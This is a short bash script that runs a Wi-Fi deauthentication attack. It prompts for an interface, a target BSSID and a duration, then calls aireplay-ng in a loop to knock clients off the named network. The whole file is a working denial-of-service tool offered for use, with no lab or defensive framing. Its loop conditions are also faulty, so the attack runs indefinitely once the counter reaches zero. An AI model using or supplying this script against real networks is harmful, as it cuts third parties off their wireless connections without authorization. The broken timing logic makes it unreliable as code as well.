#!/bin/bash


read -p "Please enter the name of the WLAN interface (e.g. wlan0): " interface
read -p "Please enter the target BSSID of the WPA3 network: " target_bssid
read -p "Enter attack duration in seconds (default is 1000): " attack_duration


if [ -z "$attack_duration" ]; then
    attack_duration=1000
fi

while [ $attack_duration -eq 0 ] || [ $attack_duration -gt 0 ]; do
    packets_sent=0
    while [ $attack_duration -eq 0 ] || [ $attack_duration -gt 0 ]; do
        for ((i=0; i<10; i++)); do
            aireplay-ng -0 1 -a $target_bssid $interface > /dev/null 2>&1
            packets_sent=$((packets_sent+1))
            echo "Packets sent: $packets_sent"
        done

        if [ $attack_duration -gt 0 ]; then
            sleep 1
            attack_duration=$((attack_duration-1))
        fi
    done
done

